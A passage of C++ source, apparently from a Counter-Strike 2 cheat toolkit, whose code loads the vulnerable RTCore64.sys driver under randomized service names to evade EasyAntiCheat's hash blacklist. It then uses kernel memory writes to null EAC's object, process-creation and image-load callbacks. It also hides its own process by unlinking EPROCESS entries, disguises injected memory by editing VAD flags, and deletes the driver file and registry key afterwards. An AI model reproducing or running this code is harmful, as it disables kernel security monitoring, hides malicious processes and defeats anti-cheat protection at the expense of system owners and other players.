            ByovdDiag("BYOVD:Init: IOCTL probe FAILED (magic=0x%04X, expect 0x5A4D)\n", magic);
            m_active = false;
            CloseHandle(m_hDevice);
            m_hDevice = INVALID_HANDLE_VALUE;
            UnloadDriver(m_actualServiceName);
            return false;
        }
        ByovdDiag("BYOVD:Init: IOCTL probe OK (ntos=0x%llX, magic=0x%04X)\n",
            (unsigned long long)m_ntosBase, magic);
    } else {
        ByovdDiag("BYOVD:Init: WARN cannot locate ntoskrnl, but driver loaded\n");
    }

    return true;
}

void KernelMemoryAccessor::Shutdown() {
    // ★ v3.96: 先发送 SERVICE_CONTROL_STOP 触发 DriverUnload → IoDeleteDevice,
    //   再 NtUnloadDriver 彻底卸载。仅 NtUnloadDriver 可能不会触发 Unload 例程,
    //   导致 \Device\RTCore64 设备对象残留 (僵尸设备)。
    EnablePrivilege(L"SeLoadDriverPrivilege");
    m_active = false;
    m_pageTableWalker.reset();
    g_physMappings.clear();

    if (!m_actualServiceName.empty()) {
        // ★ v3.96: SCM STOP → 触发驱动 Unload 例程 → IoDeleteDevice
        SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr,
            SC_MANAGER_CONNECT);
        if (hSCM) {
            SC_HANDLE hSvc = OpenServiceW(hSCM, m_actualServiceName.c_str(),
                SERVICE_STOP | SERVICE_QUERY_STATUS);
            if (hSvc) {
                SERVICE_STATUS svcStatus;
                if (ControlService(hSvc, SERVICE_CONTROL_STOP, &svcStatus)) {
                    ByovdDiag("BYOVD:Shutdown: SERVICE_CONTROL_STOP sent, waiting...\n");
                    for (int wait = 0; wait < 30; wait++) {
                        if (!QueryServiceStatus(hSvc, &svcStatus)) break;
                        if (svcStatus.dwCurrentState == SERVICE_STOPPED) break;
                        Sleep(100);
                    }
                    ByovdDiag("BYOVD:Shutdown: service state=%u\n", svcStatus.dwCurrentState);
                } else {
                    ByovdDiag("BYOVD:Shutdown: ControlService FAILED (err=%u)\n", GetLastError());
                }
                CloseServiceHandle(hSvc);
            } else {
                ByovdDiag("BYOVD:Shutdown: OpenService FAILED (err=%u)\n", GetLastError());
            }
            CloseServiceHandle(hSCM);
        }
        // NtUnloadDriver 作为兜底
        UnloadDriver(m_actualServiceName);
    }
    if (m_hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(m_hDevice);
        m_hDevice = INVALID_HANDLE_VALUE;
    }
}

// ★ v3.69: 注册 DLL 代码区域 (由 payload.cpp 在 EnableAll 前调用)
void KernelMemoryAccessor::RegisterCodeRegion(void* base, SIZE_T size) {
    if (!base || size == 0) return;
    ProtectedUserRegion region;
    region.base = reinterpret_cast<uintptr_t>(base);
    region.size = size;
    g_protectedUserRegions.push_back(region);
}

// ★ v3.69: 检查 VA 范围是否与受保护区域重叠
bool KernelMemoryAccessor::IsOverlappingProtectedRegion(uintptr_t va, SIZE_T size) {
    uintptr_t vaEnd = va + size;
    for (auto& r : g_protectedUserRegions) {
        uintptr_t rEnd = r.base + r.size;
        // 检查区间重叠: [va, vaEnd) 与 [r.base, rEnd)
        if (va < rEnd && vaEnd > r.base) {
            return true;
        }
    }
    return false;
}

bool KernelMemoryAccessor::IsKernelAddressValid(uint64_t va) {
    // 内核地址范围检查 (Windows x64 规范)
    // 内核空间: 0xFFFF800000000000 ~ 0xFFFFFFFFFFFFFFFF
    if (va < 0xFFFF800000000000ULL) return false;
    if (va > 0xFFFFFFFFFFFFFFFFULL) return false;

    // ★ v3.109: IOCTL 0x80002048 直接读取内核虚拟地址, 无需 VA→PA 转换
    //   移除 PageTableWalker 依赖 (旧代码通过物理内存扫描 PML4, 不兼容内核VA IOCTL)
    //   只要驱动可用且 VA 在内核范围, 即视为有效
    return m_active;
}

// ============================================================
// EACCallbackDisabler — 内核回调摘除核心逻辑
// ============================================================

EACCallbackDisabler& EACCallbackDisabler::Instance() {
    static EACCallbackDisabler inst;
    return inst;
}

bool EACCallbackDisabler::IsAddressInModule(uint64_t addr, uint64_t moduleBase,
                                              uint32_t moduleSize) {
    return addr >= moduleBase && addr < (moduleBase + moduleSize);
}

// ============================================================
// Sigscan: 在 ObRegisterCallbacks 函数体中查找 ObpCallbackArray
//
// ObRegisterCallbacks 中通常有:
//   lea rcx, [rip + offset]  → 48 8D 0D XX XX XX XX
//   这指向 ObpCallbackArrayHead
//
// CallbackEntry 结构体 (未文档化):
//   +0x00: LIST_ENTRY CallbackList
//   +0x16: OB_OPERATION Operations
//   +0x18: CALLBACK_ENTRY_ITEM PreOperation
//   +0x28: CALLBACK_ENTRY_ITEM PostOperation
//   +0x38: PVOID DriverObject (指向驱动对象)
//
// 摘除方法: 将 PreOperation / PostOperation 置为 NULL
// 或从链表中断开 (Unlink)
// ============================================================

uint64_t EACCallbackDisabler::FindObpCallbackArrayHead(KernelMemoryAccessor& kma) {
    uint64_t ntBase = kma.GetNtoskrnlBase();
    if (!ntBase) return 0;

    // 解析 ObRegisterCallbacks 导出
    // NT导出表 → 找到函数 RVA → 读取函数体
    uint64_t obRegAddr = kma.ResolveExport(ntBase, "ObRegisterCallbacks");
    if (!obRegAddr) return 0;

    // 读取函数体前 64 字节, 搜索 lea rcx, [rip+offset] 模式
    uint8_t funcBody[64] = {};
    if (!kma.ReadKernelVA(obRegAddr, funcBody, sizeof(funcBody))) return 0;

    for (int i = 0; i < (int)sizeof(funcBody) - 7; i++) {
        // 48 8D 0D = lea rcx, [rip + disp32]
        if (funcBody[i] == 0x48 && funcBody[i+1] == 0x8D && funcBody[i+2] == 0x0D) {
            int32_t disp = *(int32_t*)(funcBody + i + 3);
            uint64_t target = obRegAddr + i + 7 + disp; // RIP-relative
            return target;
        }
    }

    // 回退: 尝试 ObpCallbackArrayHead 直接导出 (某些 Windows 版本)
    return kma.ResolveExport(ntBase, "ObpCallbackArrayHead");
}

int EACCallbackDisabler::DisableObCallbacks(const std::string& eacDriverName) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return 0;

    uint64_t cbArrayHead = FindObpCallbackArrayHead(kma);
    if (!cbArrayHead) return 0;

    // ★ v3.68: 验证 cbArrayHead 在有效内核地址范围内
    // 防止 sigscan 误命中导致线性扫描读到无效地址
    if (cbArrayHead < 0xFFFF800000000000ULL || cbArrayHead > 0xFFFFFFFFFFFFFFFFULL)
        return 0;
    uint64_t ntBase = kma.GetNtoskrnlBase();
    if (ntBase) {
        // ObpCallbackArrayHead 应在 ntoskrnl 的数据段 (.data) 内
        // ntoskrnl 镜像通常 < 30MB, sigscan 结果应在其范围内
        if (cbArrayHead < ntBase || cbArrayHead > ntBase + 0x2000000ULL)
            return 0;
    }

    // 获取 EAC 驱动基址
    uint64_t eacBase = kma.GetKernelModuleBase(eacDriverName + ".sys");
    if (!eacBase) {
        eacBase = kma.GetKernelModuleBase("EasyAntiCheat_EOS.sys");
    }
    if (!eacBase) return 0;

    // 遍历 CALLBACK_ENTRY 数组
    // ★ v3.68: 先检测链表形式 (Flink!=自身), 若有效则走链表遍历;
    //   否则退回到线性扫描 (限制最大范围)
    // CALLBACK_ENTRY 结构 (x64):
    //   +0x00: LIST_ENTRY  (Flink, Blink)  — 16 bytes
    //   +0x10: OB_OPERATION Operations     — 1 byte
    //   +0x18: OB_PREOP_CALLBACK_STATUS PreOperation  — 8 bytes
    //   +0x28: OB_POSTOP_CALLBACK_STATUS PostOperation — 8 bytes
    //   +0x38: PVOID       DriverObject    — 8 bytes  ← 用于匹配 EAC

    constexpr uint32_t CB_ENTRY_SIZE = 0x40;
    constexpr uint32_t MAX_CALLBACKS = 256;

    int removed = 0;
    uint64_t current = cbArrayHead;

    for (uint32_t i = 0; i < MAX_CALLBACKS; i++) {
        // ★ v3.68: 每个条目读取前验证 current 仍在有效内核范围
        if (current < 0xFFFF800000000000ULL || current > 0xFFFFFFFFFFFFFF00ULL)
            break;
        if (!kma.IsKernelAddressValid(current))
            break;

        uint64_t driverObjVA = current + 0x38;
        uint64_t driverObj = kma.Read<uint64_t>(driverObjVA);

        // 通过 DriverObject → DriverSection → 驱动名匹配
        if (driverObj && driverObj > 0xFFFF800000000000ULL) {
            // 读取 DRIVER_OBJECT.DriverSection → LDR_DATA_TABLE_ENTRY
            uint64_t driverSection = kma.Read<uint64_t>(driverObj + 0x14);
            if (driverSection && driverSection > 0xFFFF800000000000ULL) {
                // LDR_DATA_TABLE_ENTRY.BaseDllName 在 +0x58
                uint64_t nameVA = driverSection + 0x58;
                WCHAR wname[64] = {};
                if (kma.ReadKernelVA(nameVA, wname, sizeof(wname) - sizeof(WCHAR))) {
                    // 比较文件名
                    char ansiName[64] = {};
                    WideCharToMultiByte(CP_ACP, 0, wname, -1, ansiName, 63, nullptr, nullptr);
                    if (_stricmp(ansiName, (eacDriverName + ".sys").c_str()) == 0 ||
                        _stricmp(ansiName, "EasyAntiCheat_EOS.sys") == 0) {

                        // NULL 化 PreOperation + PostOperation
                        uint64_t zero = 0;
                        kma.Write(current + 0x18, zero); // PreOperation
                        kma.Write(current + 0x28, zero); // PostOperation
                        removed++;
                    }
                }
            }
        }

        // 遍历到下一个条目 (通过 LIST_ENTRY.Flink)
        uint64_t flink = kma.Read<uint64_t>(current);
        if (!flink || flink == cbArrayHead) break; // 回到链表头

        // 实际结构中, CALLBACK_ENTRY 通过 LIST_ENTRY 链接
        // 但 ObpCallbackArrayHead 指向的是单独的数组而非简单链表
        // 简化处理: 线性扫描
        current += CB_ENTRY_SIZE;
    }

    return removed;
}

int EACCallbackDisabler::DisableProcessNotifyCallbacks(const std::string& eacDriverName) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return 0;

    uint64_t ntBase = kma.GetNtoskrnlBase();
    uint64_t eacBase = kma.GetKernelModuleBase(eacDriverName + ".sys");
    if (!eacBase) return 0;

    // PsSetCreateProcessNotifyRoutine → sigscan 找到 PspCreateProcessNotifyRoutine 数组
    uint64_t psSetNotify = kma.ResolveExport(ntBase, "PsSetCreateProcessNotifyRoutine");
    if (!psSetNotify) return 0;

    // 搜索 lea rcx, [rip+offset] 或 mov rcx, imm64 定位数组
    uint8_t funcBody[128] = {};
    if (!kma.ReadKernelVA(psSetNotify, funcBody, sizeof(funcBody))) return 0;

    uint64_t arrayAddr = 0;
    for (int i = 0; i < (int)sizeof(funcBody) - 7; i++) {
        // 搜索 48 8D 0D (lea rcx, [rip+...])
        if (funcBody[i] == 0x48 && funcBody[i+1] == 0x8D && funcBody[i+2] == 0x0D) {
            int32_t disp = *(int32_t*)(funcBody + i + 3);
            arrayAddr = psSetNotify + i + 7 + disp;
            break;
        }
        // 搜索 48 B9 (mov rcx, imm64)
        if (funcBody[i] == 0x48 && funcBody[i+1] == 0xB9) {
            arrayAddr = *(uint64_t*)(funcBody + i + 2);
            break;
        }
    }

    if (!arrayAddr) return 0;

    // EX_FAST_REF 数组 (每个 entry 8 bytes, 高4位是引用计数, 低60位是指针)
    // 最多 64 个回调
    int removed = 0;
    for (int i = 0; i < 64; i++) {
        uint64_t entry = kma.Read<uint64_t>(arrayAddr + i * 8);
        if (!entry) continue;

        uint64_t callbackPtr = entry & 0xFFFFFFFFFFFFFFFULL; // 清除高4位引用计数
        if (IsAddressInModule(callbackPtr, eacBase, 0x100000)) {
            // NULL 化此条目
            uint64_t zero = 0;
            kma.Write(arrayAddr + i * 8, zero);
            removed++;
        }
    }

    return removed;
}

int EACCallbackDisabler::DisableImageNotifyCallbacks(const std::string& eacDriverName) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return 0;

    uint64_t ntBase = kma.GetNtoskrnlBase();
    uint64_t eacBase = kma.GetKernelModuleBase(eacDriverName + ".sys");
    if (!eacBase) return 0;

    // PsSetLoadImageNotifyRoutine → 找到 PspLoadImageNotifyRoutine 数组
    uint64_t psSetLoadImg = kma.ResolveExport(ntBase, "PsSetLoadImageNotifyRoutine");
    if (!psSetLoadImg) return 0;

    uint8_t funcBody[128] = {};
    if (!kma.ReadKernelVA(psSetLoadImg, funcBody, sizeof(funcBody))) return 0;

    uint64_t arrayAddr = 0;
    for (int i = 0; i < (int)sizeof(funcBody) - 7; i++) {
        if (funcBody[i] == 0x48 && funcBody[i+1] == 0x8D && funcBody[i+2] == 0x0D) {
            int32_t disp = *(int32_t*)(funcBody + i + 3);
            arrayAddr = psSetLoadImg + i + 7 + disp;
            break;
        }
        if (funcBody[i] == 0x48 && funcBody[i+1] == 0xB9) {
            arrayAddr = *(uint64_t*)(funcBody + i + 2);
            break;
        }
    }

    if (!arrayAddr) return 0;

    int removed = 0;
    for (int i = 0; i < 64; i++) {
        uint64_t entry = kma.Read<uint64_t>(arrayAddr + i * 8);
        if (!entry) continue;
        uint64_t callbackPtr = entry & 0xFFFFFFFFFFFFFFFULL;
        if (IsAddressInModule(callbackPtr, eacBase, 0x100000)) {
            uint64_t zero = 0;
            kma.Write(arrayAddr + i * 8, zero);
            removed++;
        }
    }

    return removed;
}

int EACCallbackDisabler::DisableAll(const std::string& eacDriverName) {
    int total = 0;
    total += DisableObCallbacks(eacDriverName);
    total += DisableProcessNotifyCallbacks(eacDriverName);
    total += DisableImageNotifyCallbacks(eacDriverName);
    // PsSetCreateThreadNotifyRoutine 类似模式, 但 EAC 一般不注册此回调
    return total;
}

// ============================================================
// 内核导出表解析
// ============================================================

uint64_t KernelMemoryAccessor::ResolveExport(uint64_t moduleBase, const char* funcName) {
    if (!moduleBase || !m_active) return 0;

    // 读取 PE 头的 DOS 头
    IMAGE_DOS_HEADER dos = {};
    if (!ReadKernelVA(moduleBase, &dos, sizeof(dos))) return 0;
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    // 读取 NT 头
    uint64_t ntHdrVA = moduleBase + dos.e_lfanew;
    IMAGE_NT_HEADERS64 nt = {};
    if (!ReadKernelVA(ntHdrVA, &nt, sizeof(nt))) return 0;
    if (nt.Signature != IMAGE_NT_SIGNATURE) return 0;

    // 导出目录
    auto& expDir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDir.VirtualAddress || !expDir.Size) return 0;

    uint64_t expVA = moduleBase + expDir.VirtualAddress;
    IMAGE_EXPORT_DIRECTORY ied = {};
    if (!ReadKernelVA(expVA, &ied, sizeof(ied))) return 0;

    // 读取导出表 (3个数组: 名称→序号→地址)
    std::vector<uint32_t> nameRVAs(ied.NumberOfNames);
    std::vector<uint32_t> funcRVAs(ied.NumberOfFunctions);
    std::vector<uint16_t> ordinals(ied.NumberOfNames);

    if (!ReadKernelVA(moduleBase + ied.AddressOfNames, nameRVAs.data(),
                       nameRVAs.size() * sizeof(uint32_t))) return 0;
    if (!ReadKernelVA(moduleBase + ied.AddressOfFunctions, funcRVAs.data(),
                       funcRVAs.size() * sizeof(uint32_t))) return 0;
    if (!ReadKernelVA(moduleBase + ied.AddressOfNameOrdinals, ordinals.data(),
                       ordinals.size() * sizeof(uint16_t))) return 0;

    // 二分搜索导出名
    for (DWORD i = 0; i < ied.NumberOfNames; i++) {
        char name[128] = {};
        ReadKernelVA(moduleBase + nameRVAs[i], name, sizeof(name) - 1);
        if (strcmp(name, funcName) == 0) {
            uint32_t rva = funcRVAs[ordinals[i]];
            return moduleBase + rva;
        }
    }

    return 0;
}

// ============================================================
// DKOMProcessHider — EPROCESS ActiveProcessLinks 断链
//
// 警告: 此模块会触发 PatchGuard (KPP), 在 Windows 8.1+ 上
// 系统会在 2-15 分钟内 BSOD (CRITICAL_STRUCTURE_CORRUPTION)
//
// 因此默认不启用, 仅用于演示/研究目的
// ============================================================

DKOMProcessHider& DKOMProcessHider::Instance() {
    static DKOMProcessHider inst;
    return inst;
}

bool DKOMProcessHider::HideProcess() {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return false;

    uint64_t ntBase = kma.GetNtoskrnlBase();
    if (!ntBase) return false;

    // EPROCESS 偏移 (Windows 10/11):
    //   +0x440 UniqueProcessId
    //   +0x448 ActiveProcessLinks (LIST_ENTRY)
    //   +0x5A8 ImageFileName

    DWORD currentPid = GetCurrentProcessId();

    // 获取 PsInitialSystemProcess → 找到 System EPROCESS
    uint64_t psInitProcVA = kma.ResolveExport(ntBase, "PsInitialSystemProcess");
    if (!psInitProcVA) return false;

    uint64_t systemEPROCESS = kma.Read<uint64_t>(psInitProcVA);
    if (!systemEPROCESS) return false;

    // 遍历 ActiveProcessLinks 链表 → 找到我们的 EPROCESS
    uint64_t current = systemEPROCESS;
    uint64_t start   = current;

    do {
        uint64_t pidOffset = current + 0x440;
        uint64_t pid = kma.Read<uint64_t>(pidOffset);

        if ((DWORD)pid == currentPid) {
            m_eprocess = current;

            // 读取 Flink / Blink (ActiveProcessLinks 在 +0x448)
            uint64_t linksOffset = current + 0x448;
            uint64_t flinkVA = linksOffset;
            uint64_t blinkVA = linksOffset + 8;

            uint64_t flink = kma.Read<uint64_t>(flinkVA);
            uint64_t blink = kma.Read<uint64_t>(blinkVA);

            m_flinkBackup = flink;
            m_blinkBackup = blink;

            if (!flink || !blink) return false;
            if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL)
                return false;

            // 断链: Blink→Flink = 我们的Flink, Flink→Blink = 我们的Blink
            // 即: 前一个节点的 Flink 指向后一个节点
            //     后一个节点的 Blink 指向前一个节点
            // 这样跳过了当前节点
            kma.Write(blinkVA, flink);        // prev.Flink = next
            kma.Write(flinkVA + 8, blink);    // next.Blink = prev

            m_hidden = true;
            return true;
        }

        // 移动到下一个 EPROCESS
        uint64_t flink = kma.Read<uint64_t>(current + 0x448);
        if (!flink || flink < 0xFFFF800000000000ULL) break;

        current = flink - 0x448; // Flink 指向 ActiveProcessLinks, 需要减去偏移回 EPROCESS
    } while (current != start);

    return false;
}

bool DKOMProcessHider::UnhideProcess() {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive() || !m_hidden || !m_eprocess) return false;

    // 恢复 Flink / Blink
    uint64_t linksOffset = m_eprocess + 0x448;
    kma.Write(linksOffset, m_flinkBackup);
    kma.Write(linksOffset + 8, m_blinkBackup);

    m_hidden = false;
    return true;
}

// ============================================================
// KernelDefense — 一体化编排
// ============================================================

// ============================================================
// v3.33 Method 3: 驱动 PE 头变异 + 随机化服务名
//
// RTCore64.sys 的 SHA256 被 EAC 黑名单收录,
// 直接加载会被驱动签名/哈希扫描检测
//
// 策略:
//   1. 复制驱动到 %TEMP%\XXXX.sys (随机名)
//   2. 修改 PE 头: Timestamp 随机化 + CheckSum 重算
//   3. 注册为随机服务名 "SysMonXXXX"
//
// 效果: 每次运行驱动文件名+服务名+PE header 均不同,
//       EAC 黑名单按固定签名/哈希匹配 → 失效
// ============================================================
static BYOVDDriverInfo MutateAndRandomizeDriver(const BYOVDDriverInfo& original) {
    // ★ v3.96: 不再修改驱动二进制 — 任何 PE 修改 (设备名补丁/签名剥离/时间戳)
    //   都会触发 Windows 内核的 STATUS_INVALID_IMAGE_HASH (0xC0000428)。
    //   改为使用原始未修改驱动 + 原始设备名 \\.\RTCore64,
    //   通过 SCM 清理 + DefineDosDeviceW 修复僵尸设备来避免冲突。
    //
    //   仅随机化服务名 (注册表唯一性), 驱动内容保持原样。

    // 生成 4 位随机 hex 标识符
    WORD seed = (WORD)(GetTickCount() ^ (GetCurrentProcessId() & 0xFFFF) ^ GetCurrentThreadId());
    wchar_t randomHex[16] = {};
    wsprintfW(randomHex, L"%04X", seed);

    // 生成随机文件名: SysDrv_XXXX.sys
    wchar_t randomName[64] = {};
    wsprintfW(randomName, L"SysDrv_%s.sys", randomHex);

    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    wcscat_s(tempPath, randomName);

    // ★ 获取嵌入的原始驱动数据 (完全不修改)
    const uint8_t* embedData = nullptr;
    size_t embedSize = 0;
    if (original.driverPath == L"RTCore64.sys") {
        embedData = stealth::embedded::RTCore64_data;
        embedSize = stealth::embedded::RTCore64_size;
    }
    ByovdDiag("BYOVD:Mutate: embedData=0x%p embedSize=%zu\n", embedData, embedSize);

    if (!embedData || embedSize == 0 || embedSize > 100 * 1024 * 1024) {
        ByovdDiag("BYOVD:Mutate: no embedded data, falling back to file system\n");
        // 回退到文件系统
        std::wstring srcPath;
        {
            wchar_t sysDir[MAX_PATH];
            GetSystemDirectoryW(sysDir, MAX_PATH);
            wcscat_s(sysDir, L"\\drivers\\");
            wcscat_s(sysDir, original.driverPath.c_str());
            if (GetFileAttributesW(sysDir) == INVALID_FILE_ATTRIBUTES) {
                srcPath = original.driverPath;
            } else {
                srcPath = sysDir;
            }
        }
        HANDLE hSrc = CreateFileW(srcPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hSrc == INVALID_HANDLE_VALUE) return original;
        DWORD fileSize = GetFileSize(hSrc, nullptr);
        if (fileSize < 0x200 || fileSize > 100 * 1024 * 1024) { CloseHandle(hSrc); return original; }
        std::vector<uint8_t> driverData(fileSize);
        DWORD bytesRead = 0;
        ReadFile(hSrc, driverData.data(), fileSize, &bytesRead, nullptr);
        CloseHandle(hSrc);
        if (bytesRead != fileSize) return original;

        HANDLE hOut = CreateFileW(tempPath, GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hOut == INVALID_HANDLE_VALUE) return original;
        DWORD bytesWritten = 0;
        WriteFile(hOut, driverData.data(), fileSize, &bytesWritten, nullptr);
        CloseHandle(hOut);
        if (bytesWritten != fileSize) return original;
    } else {
        // 直接写入原始嵌入数据 (不做任何修改)
        HANDLE hOut = CreateFileW(tempPath, GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hOut == INVALID_HANDLE_VALUE) return original;
        DWORD bytesWritten = 0;
        WriteFile(hOut, embedData, (DWORD)embedSize, &bytesWritten, nullptr);
        CloseHandle(hOut);
        if (bytesWritten != embedSize) {
            ByovdDiag("BYOVD:Mutate: WriteFile FAILED (wrote %u/%zu)\n", bytesWritten, embedSize);
            return original;
        }
        ByovdDiag("BYOVD:Mutate: wrote original driver %u bytes to %ls\n", bytesWritten, tempPath);
    }

    if (GetFileAttributesW(tempPath) == INVALID_FILE_ATTRIBUTES) return original;

    // 构建驱动信息: 使用原始设备名 \\.\RTCore64 (驱动内部硬编码),
    //   仅服务名随机化以避免注册表冲突
    BYOVDDriverInfo mutated;
    mutated.devicePath = original.devicePath;     // ★ 保持原始 \\.\RTCore64
    mutated.ioctlCode = original.ioctlCode;
    mutated.needsMemoryMap = original.needsMemoryMap;
    mutated.driverPath = tempPath;

    wchar_t svcName[64] = {};
    wsprintfW(svcName, L"SysMon%s", randomHex);
    mutated.serviceName = svcName;
    wchar_t dspName[64] = {};
    wsprintfW(dspName, L"System Monitor %s", randomHex);
    mutated.displayName = dspName;

    ByovdDiag("BYOVD:Mutate: device=%ls svc=%ls path=%ls\n",
        mutated.devicePath.c_str(), mutated.serviceName.c_str(), mutated.driverPath.c_str());

    return mutated;
}

// ============================================================
KernelDefense::Result KernelDefense::EnableAll() {
    Result result;
    auto& kma = KernelMemoryAccessor::Instance();

    // ★ v3.37: 诊断 — HVCI 状态检测
    bool hvciEnabled = kma.IsHVCIEnabled();
    ByovdDiag("BYOVD: HVCI=%d (1=blocked all)\n", (int)hvciEnabled);

    // v3.34: 多驱动随机轮换
    int candCount = BYOVDDrivers::GetCandidateCount();
    int indices[8] = {0, 1, 2, 3, 4, 5, 6, 7};
    for (int i = candCount - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        int tmp = indices[i];
        indices[i] = indices[j];
        indices[j] = tmp;
    }

    for (int ci = 0; ci < candCount; ci++) {
        const BYOVDDriverInfo* cand = g_driverCandidates[indices[ci]];
        // ★ v3.37: 诊断 — 每个驱动尝试日志
        wchar_t drvName[64] = {};
        wcsncpy_s(drvName, cand->driverPath.c_str(), 63);
        ByovdDiag("BYOVD: trying driver[%d/%d] = %ls ...\n", ci+1, candCount, drvName);

        BYOVDDriverInfo mutated = MutateAndRandomizeDriver(*cand);
        ByovdDiag("BYOVD:EnableAll: calling Initialize...\n");
        result.driverLoaded = kma.Initialize(mutated);
        ByovdDiag("BYOVD:EnableAll: Initialize returned %d\n", (int)result.driverLoaded);

        if (result.driverLoaded) {
            ByovdDiag("BYOVD: SUCCESS with %ls\n", drvName);
            break;
        } else {
            ByovdDiag("BYOVD: FAILED %ls (HVCI=%d)\n", drvName, (int)hvciEnabled);
        }
    }

    if (!result.driverLoaded) {
        ByovdDiag("BYOVD: ALL %d drivers failed — kernel defense UNAVAILABLE\n", candCount);
        // ★ v3.37: 优雅降级 — EAC 内核回调无法摘除,
        //   但用户态防护 (StealthEngine/StealthSleep) 仍然有效
        return result;
    }

    // 2. 摘除 EAC 回调
    auto& cbDisabler = EACCallbackDisabler::Instance();
    result.obCallbacksRemoved      = cbDisabler.DisableObCallbacks("EasyAntiCheat");
    result.processCallbacksRemoved = cbDisabler.DisableProcessNotifyCallbacks("EasyAntiCheat");
    result.imageCallbacksRemoved   = cbDisabler.DisableImageNotifyCallbacks("EasyAntiCheat");
    ByovdDiag("BYOVD: callbacks removed — ob=%d proc=%d img=%d\n",
        result.obCallbacksRemoved, result.processCallbacksRemoved, result.imageCallbacksRemoved);

    return result;
}

void KernelDefense::DisableAll() {
    DKOMProcessHider::Instance().UnhideProcess();
    auto& kma = KernelMemoryAccessor::Instance();

    // v3.49: 一用即卸 — 卸载驱动 + 清除注册表 + 删除驱动文件
    if (kma.IsActive()) {
        std::wstring svcName = kma.GetServiceName();
        std::wstring drvPath = kma.GetDriverPath();

        kma.Shutdown();

        // 删除注册表服务键
        std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + svcName;
        RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath.c_str());

        // 删除 TEMP 中的驱动文件
        if (!drvPath.empty()) {
            DeleteFileW(drvPath.c_str());
        }

        ByovdDiag("BYOVD: %ls unloaded & cleaned.\n", svcName.c_str());
    }
}

// ============================================================
// v3.34: VADConcealer — VAD 节点伪装
//
// 通过 BYOVD 内核 R/W 遍历 cs2.exe 的 VAD AVL 树,
// 将注入区域的 _MMVAD_SHORT.u.VadFlags.PrivateMemory 清零,
// 使 MEM_PRIVATE → MEM_MAPPED, 绕过 EAC VAD 扫描
//
// 原理:
//   EPROCESS->VadRoot → AVL 树 (RTL_BALANCED_NODE)
//   每个 VAD 节点记录一个虚拟地址范围 (StartingVpn..EndingVpn)
//   VadFlags.PrivateMemory bit: 1 = MEM_PRIVATE, 0 = MEM_MAPPED
// ============================================================

// Win10 22H2 / Win11 x64 EPROCESS + VAD 偏移量
struct VadOffsets {
    // EPROCESS
    static constexpr uint32_t UniqueProcessId   = 0x440;
    static constexpr uint32_t ActiveProcessLinks = 0x448;
    static constexpr uint32_t VadRoot            = 0x7D8; // 主要候选
    static constexpr uint32_t VadRootAlt         = 0x658; // Win11 备选

    // _RTL_BALANCED_NODE (embedded in _MMVAD_SHORT)
    static constexpr uint32_t RbnLeft  = 0x00;
    static constexpr uint32_t RbnRight = 0x08;
    static constexpr uint32_t RbnParentEncoded = 0x10;

    // _MMVAD_SHORT (after RTL_BALANCED_NODE at +0x18)
    static constexpr uint32_t VadStartingVpn = 0x18;
    static constexpr uint32_t VadEndingVpn   = 0x20;
    static constexpr uint32_t VadFlags       = 0x30; // u.LongFlags / u.VadFlags union
    static constexpr uint32_t VadControlArea = 0x38;

    static constexpr uint64_t PrivateMemoryBit  = 0x01000000ULL; // bit 24 最常见位置
    static constexpr uint64_t ProtectionMask    = 0x00F80000ULL; // bits 19-23 (5 bits)
};

// 获取 cs2.exe 的 EPROCESS 内核地址
static uint64_t GetEPROCESSByPid(KernelMemoryAccessor& kma, DWORD targetPid, uint64_t ntosBase) {
    // PsInitialSystemProcess → ActiveProcessLinks → 遍历
    // 从 ntoskrnl 导出 PsInitialSystemProcess 指针获取 System 进程 EPROCESS
    // 简化: 硬编码 PsInitialSystemProcess 偏移
    // 备选: 通过 PsLookupProcessByProcessId 的 sigscan

    // 方法: 从 ntoskrnl 数据节定位 PsActiveProcessHead
    // PsActiveProcessHead 通常是 ntoskrnl 的导出符号
    // 简化路径: 扫描 ntoskrnl 数据段找 ActiveProcessLinks 循环起点
    uint64_t psInitAddr = kma.ResolveExport(ntosBase, "PsInitialSystemProcess");
    if (!psInitAddr) return 0;

    uint64_t sysEprocess = kma.Read<uint64_t>(psInitAddr);
    if (!sysEprocess || sysEprocess < 0xFFFF800000000000ULL) return 0;

    uint64_t current = sysEprocess;
    int maxWalk = 512;
    while (maxWalk-- > 0) {
        uint64_t pid = kma.Read<uint64_t>(current + VadOffsets::UniqueProcessId);
        if (pid == targetPid) return current;

        uint64_t flink = kma.Read<uint64_t>(current + VadOffsets::ActiveProcessLinks);
        if (!flink || flink < 0xFFFF800000000000ULL) break;
        current = flink - VadOffsets::ActiveProcessLinks;
    }
    return 0;
}

// AVL 树序遍历, 查找包含 targetVA 的 VAD 节点
static bool FindAndModifyVadNode(KernelMemoryAccessor& kma, uint64_t vadNode, uint64_t targetVa) {
    if (!vadNode || !targetVa) return false;

    uint64_t targetVpn = targetVa >> 12;
    int maxDepth = 128;

    while (vadNode && maxDepth-- > 0) {
        uint64_t startVpn = kma.Read<uint64_t>(vadNode + VadOffsets::VadStartingVpn);
        uint64_t endVpn   = kma.Read<uint64_t>(vadNode + VadOffsets::VadEndingVpn);

        if (targetVpn >= startVpn && targetVpn <= endVpn) {
            // 找到目标 VAD 节点, 修改 PrivateMemory flag
            uint64_t flags = kma.Read<uint64_t>(vadNode + VadOffsets::VadFlags);

